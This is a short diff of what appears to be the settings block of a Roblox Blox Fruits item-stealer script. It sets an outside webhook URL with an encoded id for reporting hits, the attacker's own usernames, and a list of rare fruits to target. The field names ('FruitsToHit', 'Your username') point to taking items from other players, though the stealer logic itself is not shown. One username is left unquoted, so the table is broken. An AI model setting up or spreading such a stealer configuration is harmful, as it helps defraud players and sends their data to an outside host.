@@ -1,4 +1,4 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=YThFMjZsQzQ0dDlfWld4d3JwellQdzppZjRZZW1Tdmp5aG1hNEVKcGp0WkhMQnhlbVYyYWFGQ091aXlVWE5tSHNXMXA4RlNObXJMVXFiMHV2ei1GZHFnUThpY1JCT2kweml2TzdRajZRWFNibXVySlBVZUpoSmJrbW1oMmNhSnFPNnhCQkZLLW5NUHlQOWVMR0FoWDIyRHByd29valpOX1NaVlpyVUZ0RmhWUVg4ejBMcjN6ankybUNTOUJ5SjRpQXc"
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=YThFMjZsQzQ0dDlfWld4d3JwellQdzppZjRZZW1Tdmp5aG1hNEVKcGp0WkhMQnhlbVYyYWFGQ091aXlVWE5tSHNXMXA4RlNObXJMVXFiMHV2ei1GZHFnUThpY1JCT2kweml2TzdRajZRWFNibXVySlBVZUpoSmJrbW1oMmNhSnFPNnhCQkZLLW5NUHlQOWVMR0FoWDIyRHByd29valpOX1NaVlpyVUZ0RmhWUVg4ejBMcjN6ankybUNTOUJ5SjRpQXc" -- <<< Your Webhook
 Usernames = {gsvsg26, "somealtuserhere2"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
